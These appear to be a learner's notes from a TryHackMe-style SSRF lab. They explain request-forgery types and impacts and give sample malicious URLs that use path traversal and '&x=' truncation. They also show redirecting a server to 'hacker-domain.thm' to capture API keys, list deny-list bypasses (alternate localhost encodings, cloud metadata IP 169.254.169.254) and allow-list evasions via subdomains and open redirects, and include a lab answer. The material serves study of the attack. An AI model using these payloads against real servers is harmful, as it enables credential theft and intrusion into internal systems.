
SSRF = Server-Side Request Forgery = allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

Types of SSRF
- rgular SSRF where data is returned to the attacker's screen. 
- Blind SSRF where an SSRF occurs, but no information is returned to the attacker's screen.

impact
- Access to unauthorised areas.
- Access to customer/organisational data.
- Ability to Scale to internal networks.
- Reveal authentication tokens/credentials.
--------------------------------------------------------
expected = https://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123
---------
attacker can take control over page requested by webserver


hacker
https://website.thm/stock?url=http://api.website.thm/api/user
web request
http://api.website.thm/api/user

user data to hacker	api server returns user data to the web instead of stock info

--------
show how attacker can still reach the /api/user page with only 
having control over the path by directory traversal ../ = move up directory


---------&x=  =  ?x=
control server subdomain to which the request is made. 
&x= being used to stop the remaining path from being appended to the end of the attacker url and 
and instead turns it to ?x=

hacker
http://website.thm/stock?server=api.webiste.thm/api/user&x=&id=123
web request
http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123

website return user data to hacker
api server return user data to the website instead of stock information

-------------------------------
going back to original request  the attacker can instead force the webserver 
to request a server of attackers choice. we can capture request headers that are sent to the attacker
specified domain.These headers could contain authentication credentials or API keys sent by website.thm (that would normally authenticate to api.website.thm).




hacker request 
http://website.thm/stock?url=http://hacker-domain.thm/

website request
data from hacker-domain.thm instead of api.website.thm revealing the api key
----------------------------

answer = https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
							the &x= ignores the rest of url				
SERVER request =  https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2
---------------------------------
1. When an entire URL is utilized in an address bar input
2. hidden field in a form 
	-ex in source name = server value = http://server.website.thm/store
3.  A partial URL such as just the hostname:
	-https://website.thm/form?server=api
					the api
4.Perhaps only the path of the URL:

If you are working with a blind SSRF, no output is returned back to you:

To monitor requests, you must utilize an external HTTP logging tool, such 
as requestbin.com, your own HTTP server, or Burp Suite’s Collaborator client.
---------------------------
Deny List — Except for resources provided in a list or following a certain pattern, all requests are accepted.

Its objective is to prevent the public from accessing sensitive endpoints, IP addresses, or domains while still allowing access to other sites.

Localhost is a specific endpoint to limit access to since it may contain server performance data or other sensitive information, therefore domain names like localhost and 127.0.0.1 would be on a deny list.

Attackers can evade a Deny List by utilizing alternate localhost references such as:

• 0
• 0.0.0.0
• 0000
• 127.1
• 127.*.*.*
• 2130706433
• 017700000001
• Subdomains with a DNS record that resolves to the IP Address 127.0.0.1, such as 127.0.0.1.nip.io
Deny List (Cloud Environment) — It is advantageous to restrict access to the IP address 169.254.169.254, which holds metadata for the installed cloud server, maybe sensitive information.

An attacker can get around this by registering a subdomain on their OWN domain with a DNS record pointing to 169.254.169.254
--------
Allow List — All requests are prohibited unless they appear on a list or meet a specific pattern, such as a rule requiring that a URL supplied in a parameter begin with an example of https://website.thm.

An attacker might easily get around this rule by registering a subdomain on the attacker's domain name, such as https://website.thm.attackers-domain.thm. 
• This input would now be authorized by the application logic, allowing an attacker to manipulate the internal HTTP request.
Open Redirect — It is a server endpoint where a website visitor is instantly routed to another website URL. (Bypassed strict rule)
Endpoint example: https://website.thm/link?url=https://tryhackme.com
This endpoint was designed to track how many times visitors clicked on this link for advertising/marketing purposes.

Consider a potential SSRF vulnerability with strict constraints that only allowed URLs that began with https://website.thm/.

An attacker could use the aforementioned feature to redirect the internal HTTP request to a domain of the attacker’s preference.
--------------


